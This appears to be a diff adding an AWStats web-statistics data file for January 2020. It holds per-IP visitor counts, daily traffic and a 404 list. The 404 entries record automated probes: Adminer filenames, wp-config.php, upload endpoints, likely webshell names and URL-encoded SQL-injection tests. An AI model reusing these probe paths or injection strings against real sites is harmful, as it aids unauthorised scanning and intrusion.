+/admin/upload/upfile.asp 1 http://www.act-packaging.com/admin/upload/upfile.asp
+/administrator/language/en-GB/install.xml 1 -
+/product/soft%20touch%20box.html 1 -
+/adminer-4.2.5-mysql.php 1 -
+/adminer-3.2.0-en.php 1 -
+/adminer-4.6.1-cs.php 1 -
+/adminer-3.5.0-mysql.php 1 -
+/adminer-4.2.5-mysql-cs.php 1 -
+/wp-content/adminer.php 1 -
+/backup//wp-admin/install.php 1 -
+/adminer-4.3.1-en.php 1 -
+/adminer-3.2.2-mysql-cs.php 1 -
+/README.txt 1 -
+/adminer-3.7.1-en.php 1 -
+/public/js/wind.js 5 -
+/statics/css/crop.css 11 -
+/_adminer.php 1 -
+/factory/ 3 -
+/adminer-3.4.0-mysql.php 1 -
+/_cmseditor/themes/default/default.css 1 http://act-packaging.com/_cmseditor/themes/default/default.css
+/kindeditor-4.1.10/themes/default/default.css 1 http://www.act-packaging.com/kindeditor-4.1.10/themes/default/default.css
+/adminer-3.6.4-cs.php 1 -
+/adminer-3.3.0-mysql-en.php 1 -
+/adminer-4.0.1-mysql-en.php 1 -
+/searchreplacedb2.php 1 -
+/adminer-3.6.2-mysql.php 1 -
+/install.php 3 -
+/admin/southidceditor/dialog/dialog.js 1 http://www.act-packaging.com/admin/southidceditor/dialog/dialog.js
+/manage/login.php 2 -
+/adminer-3.6.1.php 1 -
+//wangdafa 4 -
+/adminer-4.7.0.php 1 -
+/adminer-4.7.3-mysql.php 1 -
+/adminer-4.6.3-mysql.php 1 -
+/wp.php 1 -
+/installer-backup.php 1 -
+/adminer-3.6.0-cs.php 1 -
+/adminer-4.2.5.php 1 -
+/adminer-4.1.0-en.php 1 -
+//ctx.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-4.2.2.php 1 -
+/admin/southidceditor/upload.asp 4 http://www.act-packaging.com/admin/southidceditor/upload.asp
+/admin/SouthidcEditor/asp/upload_json.asp 1 http://www.act-packaging.com/admin/SouthidcEditor/asp/upload_json.asp
+//wp-admin/install.php 1 -
+/wp-content/plugins/simple-fields/js/chosen/chosen.css 1 -
+//laravel.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/adminer-3.6.1-mysql-cs.php 1 -
+/adminer-4.3.1-mysql-cs.php 1 -
+/adminer-3.7.1-mysql.php 1 -
+/admin/login.php 5 -
+/adminer-4.2.1-mysql-en.php 1 -
+/adminer.php 2 -
+/ckfinder/core/connector/asp/connector.asp 2 http://www.act-packaging.com/ckfinder/core/connector/asp/connector.asp
+/adminer-4.4.0-mysql-cs.php 1 -
+/adminer-4.3.1-cs.php 1 -
+/public/js/image.js 9 -
+/%20and%201%3E1 1 -
+/home//wp-admin/install.php 1 -
+/%20and%201%3D1 1 -
+/adminer-4.7.3-mysql-cs.php 1 -
+/pma/print.css 2 -
+/magento_version 3 -
+/adminer-3.3.3.php 1 -
+/vendor/phpunit/phpunit/build.xml 1 -
+/editor/themes/default/default.css 2 http://act-packaging.com/editor/themes/default/default.css
+/adminer-3.2.1.php 1 -
+//hs.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/wp-content/plugins/fv-wordpress-flowplayer/css/flowplayer.css 1 -
+/wp-config.php 1 -
+/wp-content/plugins/insert-php/admin/assets/js/tag-it.js 1 -
+/replace.php 1 -
+/extension/d_blog_module/search&tag=aaa 1 -
+/adminer-4.0.2-mysql-en.php 1 -
+/adminer-4.2.5-cs.php 1 -
+/adminer-4.6.3.php 1 -
+//data/cache/hy.php 1 -
+/wp-content/plugins/easy-wp-smtp/js/script.js 1 -
+/news/55.html 1 -
+/test//wp-admin/install.php 1 -
+/wp-content/plugins/wp-live-chat-software-for-wordpress/plugin_files/js/livechat.js 1 -
+/data/admin/allowurl.txt 6 -
+/adminer-4.1.0-cs.php 1 -
+/adminer-4.0.2.php 1 -
+/dev//wp-admin/install.php 1 -
+/product/Stationery.html 1 -
+/wp-content/plugins/responsive-coming-soon/templates/template1/assets/css/style.css 1 -
+/adminer-4.6.2-mysql-en.php 1 -
+/adminer-4.1.0-mysql.php 1 -
+/2121121121212.1 1 -
+/adminer-4.6.2-en.php 1 -
+//skin/default/images/logo.gif/1.php 1 http://\xef\xbb\xbfhttp://www.terraindrainage.com/
+/util/login.aspx 3 -
+/product/Book%20Box.html 1 -
+/mysql/print.css 2 -
+//plus/mytag_js.php 2 -
+/user/register/ 2 -
+/adminer-4.2.3.php 1 -
+/adminer-4.2.3-cs.php 1 -
+/adminer-3.3.4.php 1 -
+/adminer-3.5.0.php 1 -
+/demo//wp-admin/install.php 1 -
+/public/Editor/themes/default/default.css 2 http://www.act-packaging.com/public/Editor/themes/default/default.css
+/adminer-4.6.2-mysql-cs.php 1 -
+/plugins/system/debug/debug.xml 1 -
+/wp-admin/setup-config.php 1 -
+/main//wp-admin/install.php 1 -
+END_SIDER_404
+
+# Host - Pages - Hits - Bandwidth - Last visit date - [Start date of last visit] - [Last page of last visit]
+# [Start date of last visit] and [Last page of last visit] are saved only if session is not finished
+# The 10 first Hits must be first (order not required for others)
+BEGIN_VISITOR 423
+91.206.14.103 521 521 11583074 20200129111517
+35.187.42.142 272 300 7592969 20200130130902
+35.241.252.110 269 297 7521434 20200101034142
+128.69.207.250 137 137 4574062 20200103233530
+130.211.61.57 113 141 3695955 20200115145005
+198.27.124.169 69 1998 56889657 20200123075539
+152.89.216.57 56 70 2435787 20200119061901
+52.142.25.231 50 51 251834 20200112233504
+35.129.66.135 28 960 25896551 20200121163640
+66.246.224.12 23 23 657754 20200131021000
+40.77.189.84 0 2 183957 
+87.116.191.75 3 3 11188 20200101220759
+199.87.12.15 1 47 1408579 20200131102728
+185.206.224.215 2 2 38655 20200126133744
+111.206.198.170 0 1 20656 
+180.245.226.54 1 1 3725 20200101214610
+138.246.253.5 2 2 0 20200115073555
+65.51.46.114 10 432 17892579 20200123150107
+47.100.53.146 1 1 28598 20200118153016
+122.255.32.35 2 2 7460 20200102192228
+220.181.51.119 0 2 39340 
+185.12.7.25 1 1 28598 20200104104641
+79.110.164.22 6 6 197829 20200107113902
+40.77.188.132 0 1 121260 
+162.158.68.229 1 1 0 20200122063230
+107.173.85.24 1 1 18091 20200107023637
+159.203.127.89 10 27 978186 20200129120536
+40.77.189.110 0 1 2631 
+185.98.7.232 2 2 57196 20200129215646
+110.54.240.224 1 6 614750 20200128031158
+85.105.169.84 3 144 5237681 20200102011257
+91.234.217.2 1 1 28598 20200129104245
+185.112.82.239 2 2 38655 20200110204308
+107.173.209.21 3 3 71099 20200102174832
+158.69.127.133 12 12 308694 20200113131622
+110.229.216.10 3 3 85794 20200109223725
+40.77.189.133 0 1 196580 
+194.26.29.119 8 8 392720 20200126010824
+134.90.149.148 6 6 115965 20200103230615
+154.16.98.251 1 1 23238 20200107023639
+14.152.69.137 1 27 1010069 20200130134203
+191.102.182.208 1 1 28598 20200108193906
+191.184.17.181 1 1 28598 20200102105542
+192.42.116.13 4 52 2012882 20200126225022
+108.6.129.35 15 437 14308282 20200120063013
+178.17.170.116 4 52 2012882 20200124073948
+14.183.71.208 9 9 33566 20200102202854
+35.196.132.14 2 2 57196 20200101081249
+188.165.235.173 2 2 57196 20200129181647
+68.231.199.106 8 156 4023425 20200103021636
+84.17.47.66 3 3 65104 20200113054950
+211.75.214.1 11 256 9294426 20200109212552
+40.77.191.11 0 1 84355 
+125.214.60.15 4 4 14921 20200102201215
+189.5.137.154 2 40 1051795 20200115075751
+54.186.68.101 1 1 28598 20200120210733
+174.231.4.230 4 142 7544271 20200111231312
+69.58.178.28 3 3 87652 20200129194547
+185.195.24.52 1 1 0 20200115223418
+78.47.228.112 1 1 28598 20200128022434
+40.77.189.60 0 1 4967 
+52.243.59.79 6 6 197829 20200107113909
+198.71.226.19 2 2 90915 20200115032439
+154.238.91.42 1 1 3723 20200102192028
+3.227.170.71 2 2 57196 20200110014144
+100.2.25.158 2 87 3118893 20200108235211
+107.129.111.30 2 59 3255810 20200129002407
+110.229.223.201 1 1 28598 20200109192750
+209.52.88.147 2 2 57196 20200121203120
+98.6.44.130 0 1 22843 
+106.11.222.67 0 1 121260 
+36.75.141.66 5 5 18651 20200102200339
+94.130.26.91 6 6 141526 20200130141946
+161.117.232.91 1 58 3227212 20200108215749
+140.120.9.166 3 3 11185 20200101231830
+42.236.10.77 1 1 28598 20200110053641
+185.212.171.153 2 2 38655 20200105044741
+123.123.219.40 1 1 28598 20200109140234
+180.242.182.153 5 5 18666 20200101233017
+18.236.222.210 1 1 28598 20200131212018
+217.66.250.242 5 5 18646 20200102200147
+84.17.46.21 2 2 38655 20200131173451
+82.208.114.230 2 2 57196 20200130225623
+121.120.86.184 6 6 22422 20200101231538
+31.13.191.77 8 8 154620 20200110145743
+47.98.62.203 1 1 28598 20200130151612
+104.227.246.106 1 1 28598 20200112104046
+3.94.83.118 1 1 3472 20200101220026
+93.100.153.184 1 1 28598 20200101175716
+64.233.172.182 0 37 2089795 
+185.112.82.229 2 2 38655 20200108214916
+185.183.84.197 2 92 4134365 20200107204905
+40.77.189.196 0 1 43384 
+38.145.99.74 1 1 22902 20200107023636
+35.231.247.101 2 2 57196 20200129194211
+210.32.136.160 5 5 18642 20200101232521
+123.21.231.7 1 1 17069 20200107113939
+100.2.126.229 2 87 3118893 20200124144445
+124.122.37.66 3 75 3891950 20200130151833
+41.35.148.49 3 3 11200 20200101231053
+5.255.174.141 2 2 57196 20200124082756
+36.78.7.47 0 1 22843 
+115.212.183.178 1 1 28598 20200106102723
+40.77.188.1 0 2 20243 
+209.97.159.128 10 27 978186 20200121095005
+106.11.223.28 1 1 28598 20200130140239
+174.91.60.190 1 1 19263 20200130161602
+54.190.164.232 1 1 28598 20200118211330
+93.124.88.73 1 1 28598 20200104233231
+117.201.13.85 1 1 3731 20200101231956
+160.116.0.30 2 2 38655 20200120073816
+176.113.72.120 1 1 28598 20200114175906
+60.242.187.187 6 142 6424970 20200105231127
+156.209.20.190 1 1 28598 20200113041532
+18.236.171.229 1 1 28598 20200110212359
+106.11.223.13 0 2 224928 
+31.13.191.86 2 2 38655 20200102212054
+34.231.68.152 1 1 28598 20200117142907
+223.74.168.116 7 256 12645031 20200124233311
+173.212.239.226 2 2 57196 20200121185231
+40.77.188.18 0 1 196580 
+184.94.240.92 11 11 379237 20200110104002
+47.92.98.215 1 1 28598 20200103152637
+66.249.142.209 1 1 21831 20200107023640
+123.136.106.104 1 1 3728 20200101230956
+189.225.147.222 2 2 7464 20200101230242
+37.115.210.9 5 5 105785 20200103214407
+142.93.139.204 1 1 28598 20200106170740
+64.246.165.190 1 1 28598 20200114012352
+45.125.65.45 4 52 2012882 20200118230314
+178.165.72.177 4 52 2012882 20200130122104
+47.97.120.5 1 1 28598 20200118154105
+104.236.63.51 11 28 997449 20200113025806
+31.13.191.89 2 2 38655 20200101212647
+89.254.143.104 1 1 17069 20200107113858
+176.121.14.176 2 116 6454424 20200127162949
+35.172.142.39 4 4 114392 20200125165913
+40.77.190.1 0 1 10893 
+40.77.188.14 0 2 126857 
+101.132.193.68 1 1 28598 20200121145117
+40.77.190.63 0 1 5597 
+51.15.15.164 1 1 24328 20200131104752
+5.196.76.222 2 2 57196 20200129130750
+78.101.68.224 1 1 19263 20200111044930
+91.134.122.252 2 2 22619 20200131101444
+24.90.83.140 3 129 4137041 20200122155653
+220.181.51.101 1 1 28598 20200125003459
+51.15.109.127 1 1 28598 20200101182221
+54.190.53.224 1 1 23114 20200127022526
+45.55.244.149 11 28 997449 20200104175824
+37.48.73.205 1 1 22902 20200131132457
+40.77.189.147 0 2 11720 
+212.1.212.4 2 2 42331 20200111102007
+47.92.2.67 1 1 28598 20200112145142
+64.233.172.180 1 33 2778052 20200112154029
+107.172.42.101 1 1 19263 20200107045118
+84.17.53.19 8 8 154620 20200119154106
+104.168.57.187 3 3 59744 20200114025844
+70.23.99.176 5 180 7281856 20200107142131
+23.108.52.126 1 1 28598 20200116143620
+217.138.194.121 2 2 38655 20200101004321
+78.47.49.93 1 1 28598 20200128022432
+185.234.218.50 1 1 28598 20200103112201
+138.255.190.133 7 7 26114 20200102202818
+202.47.49.215 0 1 29627 
+95.173.172.164 1 1 28598 20200123040558
+167.86.93.129 1 1 28598 20200124201820
+111.206.222.52 0 1 9350 
+104.140.73.31 2 2 36506 20200114180805
+211.176.125.70 1 1 28598 20200108115556
+50.92.168.201 2 2 57196 20200123095710
+100.26.11.117 1 1 28598 20200126151350
+107.6.183.226 1 1 28598 20200101034037
+62.102.148.69 4 52 2012882 20200110102423
+69.28.93.123 1 1 28598 20200114053640
+67.239.246.187 6 6 128074 20200107113913
+78.47.228.111 1 1 28598 20200128022435
+107.6.183.162 1 1 28598 20200102115010
+218.55.154.21 6 6 22103 20200102194219
+46.28.105.118 1 1 28598 20200129115105
+117.6.216.157 2 2 7460 20200101230605
+40.77.188.64 0 1 2937 
+167.172.250.19 1 1 28598 20200103051028
+24.90.85.101 3 137 5176826 20200123085237
+84.17.60.155 3 3 65104 20200127132433
+98.14.142.185 1 40 1416575 20200130130800
+111.206.222.204 0 1 23332 
+47.97.220.124 1 1 28598 20200115162638
+139.192.17.100 1 58 3227212 20200103194929
+14.188.196.221 1 1 3736 20200102200732
+101.132.182.68 1 1 28598 20200109145936
+156.216.48.2 3 3 11178 20200102193324
+159.203.90.26 1 3 253526 20200125112946
+31.13.191.94 4 4 77310 20200113210955
+2.58.29.146 14 14 270585 20200117043319
+47.226.131.171 8 8 29843 20200101232832
+36.76.187.102 5 5 18680 20200102203247
+5.114.163.199 1 1 3730 20200102193242
+173.251.126.226 2 98 6511828 20200103114451
+24.126.107.0 2 74 4191769 20200112131709
+109.70.100.28 4 52 2012882 20200122153344
+216.158.194.96 2 2 57196 20200113201106
+173.211.76.60 1 1 28598 20200105083700
+209.52.88.156 7 7 200186 20200131160103
+71.6.165.200 1 1 28598 20200113161621
+161.129.66.236 2 2 38655 20200130185405
+185.220.101.25 4 52 2012882 20200104135729
+107.6.171.130 1 1 28598 20200109125433
+104.140.73.30 3 3 59744 20200122104409
+190.15.87.77 2 2 7450 20200102191905
+40.77.190.111 0 1 4934 
+107.175.13.155 1 1 22201 20200107023640
+104.37.31.240 3 127 6403509 20200124110146
+159.65.46.82 10 27 978186 20200108215115
+35.237.51.66 2 2 57196 20200109101253
+104.140.73.60 3 3 59744 20200110100253
+88.242.202.48 1 1 3726 20200101225940
+51.91.10.98 1 1 28598 20200122120943
+142.179.42.170 1 1 28598 20200119221947
+118.100.103.36 3 3 11200 20200101231253
+91.132.138.38 1 1 28598 20200110101827
+117.212.89.60 1 1 28598 20200131005546
+180.246.71.172 1 1 3730 20200102195153
+185.242.4.51 7 172 6474874 20200131105131
+82.202.204.118 3 3 70763 20200121142644
+64.16.46.167 2 2 7465 20200101232049
+209.52.88.3 4 4 114392 20200125085100
+40.77.190.239 0 1 837 
+40.118.187.143 2 2 57196 20200102091154
+107.174.151.23 1 1 17243 20200107045122
+72.167.223.142 2 2 90915 20200106075529
+180.244.235.31 12 12 44758 20200101233209
+37.120.203.72 2 2 38655 20200128021407
+104.36.18.251 1 1 28598 20200127162046
+183.147.0.179 2 2 57196 20200123214643
+40.78.23.161 2 2 90915 20200119010638
+31.13.191.73 2 2 38655 20200103190248
+64.66.12.31 1 1 3731 20200102182301
+54.183.122.21 1 1 28598 20200125041429
+180.163.226.138 1 1 28598 20200110053708
+40.77.190.173 0 1 7071 
+52.6.136.4 1 1 28598 20200106212845
+40.77.191.188 0 1 6123 
+162.158.69.91 1 1 0 20200104112038
+104.245.145.4 1 1 19263 20200129112511
+40.77.191.44 0 2 203651 
+107.175.92.123 1 1 17243 20200102174834
+199.83.232.97 0 2 353626 
+192.42.116.27 4 52 2012882 20200105035918
+79.142.76.209 2 2 38655 20200115174205
+61.151.178.174 1 10 147750 20200130151926
+47.92.148.120 2 2 57196 20200127152305
+47.92.107.192 1 1 28598 20200106143429
+64.150.216.173 4 4 14668 20200101223014
+125.117.174.174 1 1 28598 20200115233056
+172.58.35.197 1 1 28598 20200116022708
+4.28.226.82 2 94 2817158 20200122151551
+84.17.53.22 2 2 38655 20200105091232
+35.229.118.29 2 2 57196 20200125174317
+35.237.42.86 2 2 57196 20200105094353
+40.77.190.246 0 1 6123 
+186.213.75.87 1 1 3732 20200102202645
+69.50.139.168 2 2 39971 20200112211440
+40.77.188.56 0 1 10893 
+203.133.171.111 20 30 769024 20200127195602
+114.143.144.162 10 10 251498 20200104010721
+85.104.254.74 2 2 7462 20200101222850
+195.181.166.142 8 8 154620 20200121232358
+31.31.225.15 2 2 57196 20200101165129
+14.186.12.190 2 2 39971 20200107113908
+173.36.240.175 1 47 1408579 20200130031345
+14.181.87.189 13 13 48504 20200101233227
+165.227.215.206 1 11 293683 20200113110408
+35.229.42.218 2 2 57196 20200117111306
+101.132.131.7 1 1 28598 20200115162834
+47.100.38.9 1 1 28598 20200103153136
+101.89.29.92 1 11 293683 20200130134325
+84.17.46.27 2 2 38655 20200130142109
+40.77.189.156 0 3 229895 
+34.223.65.230 1 1 28598 20200118211333
+116.62.215.53 1 1 28598 20200124165241
+64.137.117.234 1 1 21831 20200107023641
+134.90.149.150 2 2 38655 20200104235828
+81.93.194.45 4 103 4288253 20200129095930
+51.89.228.207 1 1 28598 20200113060944
+39.107.121.196 1 1 28598 20200112150214
+34.220.178.184 1 1 28598 20200124212834
+190.80.34.68 2 2 7453 20200102195623
+40.77.190.75 0 1 841 
+209.150.41.20 7 263 9764198 20200110134355
+180.245.202.98 1 1 3732 20200102195855
+94.138.208.146 1 1 28598 20200118101825
+178.62.82.141 7 7 177313 20200120043948
+124.122.110.63 4 4 14927 20200101232056
+18.237.69.108 1 1 28598 20200125105101
+64.140.145.129 2 2 57196 20200124092519
+189.78.95.138 1 1 3724 20200102190850
+189.225.148.242 3 3 11179 20200101233102
+172.58.35.174 3 3 85794 20200103140702
+78.46.127.248 1 1 22902 20200117120616
+78.47.40.121 1 1 28598 20200128022434
+159.203.103.134 1 4 337881 20200117075353
+67.81.107.245 16 553 21971271 20200128162404
+100.8.170.158 14 422 18116385 20200128092151
+170.254.95.67 2 2 7456 20200101220745
+115.135.191.72 1 6 614750 20200125202204
+40.77.188.121 0 1 84355 
+185.206.224.212 2 2 38655 20200119005536
+69.203.93.161 4 143 7553621 20200109162751
+34.220.172.89 1 1 28598 20200107212227
+167.99.211.55 2 2 51500 20200110053213
+117.218.108.31 2 102 5342260 20200129100119
+52.55.5.16 5 5 142990 20200131055934
+40.77.190.214 0 1 6123 
+14.192.214.93 4 4 14908 20200101232802
+5.39.11.45 4 4 28598 20200110132241
+40.77.189.201 0 1 837 
+51.77.246.199 1 58 3227212 20200113131856
+89.163.143.8 3 51 2012793 20200110220119
+66.240.236.119 1 1 28598 20200109045124
+52.25.79.106 1 1 3472 20200102192421
+185.112.82.235 4 4 77310 20200130172819
+49.7.20.28 10 10 285980 20200131163509
+54.218.93.241 1 1 28598 20200109212437
+40.77.190.181 0 1 9350 
+204.108.110.4 0 1 29627 
+45.41.179.88 1 1 22354 20200107023642
+64.233.172.178 1 46 1586577 20200112154026
+209.52.88.15 1 1 28598 20200117125333
+54.214.71.240 1 1 28598 20200102212100
+171.6.187.1 19 19 70892 20200102203135
+47.98.96.116 1 1 28598 20200106143756
+23.94.103.125 1 1 17243 20200107050635
+86.181.217.233 1 1 28598 20200116022231
+60.182.118.21 1 1 28598 20200107120929
+98.109.56.114 4 174 6249630 20200123165333
+190.219.235.123 4 4 14925 20200102200707
+47.96.12.13 1 1 28598 20200130143758
+40.77.191.25 0 1 4934 
+51.68.152.26 2 2 57196 20200118154008
+58.250.125.185 10 10 288652 20200131163509
+46.101.122.215 6 6 171588 20200115045344
+31.13.191.107 2 2 38655 20200104193432
+74.72.253.163 5 181 7310241 20200124132251
+106.11.222.94 1 1 28598 20200130140246
+171.251.238.78 6 6 22366 20200101232758
+101.21.148.52 1 1 28598 20200124234454
+76.168.17.37 3 59 3279873 20200121183351
+123.136.115.53 1 1 3738 20200101222049
+180.246.208.235 11 11 41029 20200102202142
+106.14.204.78 2 2 57196 20200127150133
+111.206.198.143 0 1 1281 
+162.213.38.187 1 1 28598 20200122055713
+36.79.249.34 13 13 48508 20200102202950
+5.8.18.180 3 3 85794 20200129114621
+35.237.6.60 2 2 57196 20200113104133
+13.57.230.231 3 33 860322 20200127213745
+196.216.220.182 2 2 7456 20200101231514
+45.248.78.75 1 1 28598 20200108000540
+37.120.192.22 10 10 193275 20200126044306
+40.76.79.103 1 1 28598 20200101094653
+184.154.47.2 1 1 28598 20200130161053
+5.188.210.4 1 1 25370 20200106180208
+89.187.178.238 2 2 28598 20200119123918
+40.77.190.9 0 3 12879 
+106.39.246.14 10 10 285980 20200131163509
+198.46.214.183 1 1 19263 20200107050616
+172.245.147.74 1 1 21831 20200107023642
+114.122.197.19 2 2 7460 20200101231150
+40.77.189.101 0 1 121260 
+84.39.112.93 6 6 115965 20200125000804
+185.206.224.209 2 2 38655 20200120100417
+37.120.203.71 10 10 193275 20200131152825
+160.177.85.49 1 1 28598 20200130073654
+220.184.202.188 2 92 4134365 20200109224715
+104.254.92.218 1 1 28598 20200124141057
+172.69.24.202 1 1 0 20200104112038
+40.77.190.5 0 1 2631 
+172.69.25.140 1 1 0 20200122063230
+139.99.121.234 1 1 28598 20200130210013
+64.137.111.60 1 1 28598 20200107023634
+60.191.38.77 4 4 114392 20200131170926
+50.1.62.68 4 4 114392 20200129084930
+5.199.135.107 4 52 2012882 20200111011301
+47.88.46.21 3 3 85794 20200105065357
+40.77.190.244 0 1 2937 
+125.163.54.238 1 1 3730 20200101220232
+54.174.43.128 5 5 142990 20200110015709
+40.77.190.146 0 2 5771 
+209.52.88.5 17 17 486166 20200119124442
+150.109.53.202 1 1 28598 20200130151812
+40.77.189.43 0 1 43384 
+13.80.5.200 1 1 28598 20200114142557
+185.104.187.115 8 8 154620 20200118221821
+40.77.188.105 0 1 9350 
+185.206.224.216 2 2 38655 20200122085216
+40.77.189.176 0 1 140573 
+37.48.122.83 1 1 28598 20200108095554
+209.52.88.245 1 1 28598 20200102021745
+79.142.76.211 2 2 38655 20200129051810
+3.135.201.205 13 214 7798534 20200111010435
+213.159.213.236 2 2 57196 20200120225013
+38.121.232.65 14 21 823942 20200106223546
+47.100.38.232 1 1 28598 20200121152049
+87.116.176.234 1 1 3726 20200101231106
+201.141.229.161 1 1 3731 20200102194401
+52.89.81.141 1 1 28598 20200126002945
+37.48.67.137 1 1 28598 20200118073708
+185.220.101.74 3 51 2012793 20200113101130
+176.40.236.254 1 1 3731 20200101215932
+184.174.124.133 2 2 50930 20200128171422
+149.20.241.63 1 1 28598 20200104093732
+191.96.148.150 1 1 36152 20200107023638
+69.197.154.194 1 1 28598 20200130124327
+126.74.91.61 1 1 3738 20200101222120
+171.239.83.197 4 4 14923 20200101232419
+40.77.190.176 0 2 3778 
+59.37.97.54 2 2 57196 20200117180453
+68.174.178.35 2 86 3114358 20200112055753
+118.100.164.181 3 3 11196 20200102202812
+185.93.3.108 3 3 65104 20200103195112
+104.196.154.205 2 2 57196 20200121151204
+114.162.101.225 1 53 1985932 20200106185954
+END_VISITOR
+
+# Date - Pages - Hits - Bandwidth - Visits
+BEGIN_DAY 31
+20200101 429 489 9716707 56
+20200102 96 237 5965148 42
+20200103 170 473 19205791 17
+20200104 37 102 3510727 13
+20200105 23 207 8772544 10
+20200106 27 86 3165000 12
+20200107 54 319 12597333 31
+20200108 23 182 7573189 11
+20200109 31 505 21364243 15
+20200110 53 406 14816361 20
+20200111 30 417 17588869 11
+20200112 71 342 14368507 16
+20200113 47 179 7343962 19
+20200114 30 395 15163562 16
+20200115 135 202 5270237 13
+20200116 8 10 259540 7
+20200117 21 24 837249 14
+20200118 59 114 3959419 13
+20200119 28 35 1173812 10
+20200120 29 451 14648699 7
+20200121 55 1060 30521410 12
+20200122 26 292 9332919 16
+20200123 93 2393 72206716 14
+20200124 42 781 35443739 21
+20200125 19 30 1370153 15
+20200126 26 74 2548412 14
+20200127 20 108 4504006 12
+20200128 42 992 40998443 13
+20200129 565 838 26128031 22
+20200130 310 591 18750632 26
+20200131 27 255 9010366 16
+END_DAY
+
+# Session range - Number of visits
+BEGIN_SESSION 7
+1h+ 12
+5mn-15mn 11
+2mn-5mn 13
+15mn-30mn 17
+30s-2mn 36
+0s-30s 437
+30mn-1h 8
+END_SESSION
+
+# URL - Pages - Bandwidth - Entry - Exit
+# The 10 first Pages must be first (order not required for others)
+BEGIN_SIDER 8
+/index.php 1912 48163201 142 184
+/ 401 11274292 320 267
+/admin/ 220 819660 72 72
+/admin/index.php 48 185530 0 1
+/fonts/linea-arrows-10.woff 37 285344 0 7
+// 4 114392 0 1
+/blog/robots.txt 3 0 0 1
+/joomla/robots.txt 1 0 0 1
+END_SIDER
